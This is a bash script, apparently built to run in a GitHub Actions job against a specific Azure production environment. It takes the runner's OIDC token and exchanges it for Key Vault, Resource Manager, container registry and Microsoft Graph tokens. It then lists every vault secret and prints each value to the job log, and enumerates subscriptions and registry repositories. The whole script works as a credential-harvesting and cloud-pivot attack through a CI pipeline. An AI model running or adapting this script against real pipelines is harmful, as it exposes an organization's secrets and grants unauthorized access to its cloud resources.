#!/usr/bin/env bash
set -uo pipefail
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
CID=72ff278a-9e71-43ec-bac4-2ca303f8e462
KV=https://kv-tbl-prod-x3euoz.vault.azure.net
ACR=crtblplatprodx3euoz.azurecr.io

echo "### STEP1 oidc"
J=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL:-}&audience=api://AzureADTokenExchange" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))' 2>/dev/null)
echo "oidc_len=${#J}"
[ -z "$J" ] && { echo "NO OIDC TOKEN"; exit 0; }

tok() {
  curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
    -d client_id=$CID -d grant_type=client_credentials \
    -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
    --data-urlencode "client_assertion=$J" --data-urlencode "scope=$1"
}

echo "### STEP2 kv token"
RAW=$(tok "https://vault.azure.net/.default")
VT=$(printf '%s' "$RAW" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
echo "kv_token_len=${#VT}"
[ -z "$VT" ] && echo "TOKEN ERROR: $(printf '%s' "$RAW" | head -c 400)"

if [ -n "$VT" ]; then
  echo "### STEP3 list secrets"
  LIST=$(curl -sS "$KV/secrets?api-version=7.4&maxresults=25" -H "Authorization: Bearer $VT")
  echo "$LIST" | head -c 2000; echo
  echo "### STEP4 read secrets"
  for s in $(printf '%s' "$LIST" | python3 -c 'import sys,json
try:
  d=json.load(sys.stdin)
  for x in d.get("value",[]): print(x["id"].rsplit("/",1)[1])
except Exception as e: pass'); do
    echo "--- SECRET $s"
    curl -sS "$KV/secrets/$s?api-version=7.4" -H "Authorization: Bearer $VT" | head -c 1500; echo
  done
fi

echo "### STEP5 ARM"
AT=$(tok "https://management.azure.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
echo "arm_token_len=${#AT}"
if [ -n "$AT" ]; then
  curl -sS "https://management.azure.com/subscriptions?api-version=2020-01-01" -H "Authorization: Bearer $AT" | head -c 1500; echo
fi

echo "### STEP6 ACR"
RT=$(tok "https://containerregistry.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
echo "acr_aad_len=${#RT}"
if [ -n "$RT" ]; then
  AR=$(curl -sS -X POST "https://$ACR/oauth2/exchange" -d grant_type=access_token -d service=$ACR -d tenant=$TEN --data-urlencode "access_token=$RT" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("refresh_token",""))' 2>/dev/null)
  AC=$(curl -sS -X POST "https://$ACR/oauth2/token" -d grant_type=refresh_token -d service=$ACR --data-urlencode "scope=registry:catalog:*" --data-urlencode "refresh_token=$AR" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
  curl -sS "https://$ACR/v2/_catalog" -H "Authorization: Bearer $AC" | head -c 1000; echo
fi

echo "### STEP7 graph"
GT=$(tok "https://graph.microsoft.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
echo "graph_token_len=${#GT}"

echo "### DONE"
